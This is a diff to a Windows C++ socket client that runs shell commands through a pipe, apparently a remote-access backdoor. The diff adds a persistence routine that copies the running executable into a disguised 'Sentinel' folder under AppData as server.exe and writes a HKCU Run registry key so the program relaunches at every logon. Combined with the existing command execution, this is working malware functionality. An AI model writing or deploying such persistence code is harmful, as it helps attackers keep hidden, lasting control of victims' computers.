@@ -1,9 +1,12 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
+#include <fstream> 
 #include <string>
 #include <sstream>
 #include <stdio.h>
+#include <filesystem>
+#include <shlobj.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -21,6 +24,34 @@ std::string execCommand(const std::string& cmd) {
     _pclose(pipe);
     return result;
 }
+
+//persistance setup copies itself to Appdata and Run key
+void addPersistance(){
+    char appDataPath[MAX_PATH];
+    SHGetFolderPathA(NULL , CSIDL_APPDATA , NULL , 0 , appDataPath);
+
+    std::string folderPath = std::string(appDataPath) + "\\Sentinel";
+    std::string TargetPath = folderPath + "\\server.exe";
+
+    // if already persisted, skip 
+    if(std::filesystem::exists(TargetPath)) return;
+
+    // create folder if exists 
+    std::filesystem::create_directory(folderPath);
+
+    //Get path to current executable 
+    char CurrentPath[MAX_PATH];
+    GetModuleFileNameA(NULL , CurrentPath , MAX_PATH);
+
+    //Copy iteself to target location 
+    std::filesystem::copy(CurrentPath , TargetPath , std::filesystem::copy_options::overwrite_existing);
+
+    //Set registery key to run on startup 
+    HKEY hkey; 
+    RegOpenKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
+    RegSetValueExA(hkey, "Sentinel", 0, REG_SZ, (BYTE*)TargetPath.c_str(), TargetPath.size() + 1);
+    RegCloseKey(hkey);
+};
 
 int main() {
     std::cerr << "[*] Starting client\n";
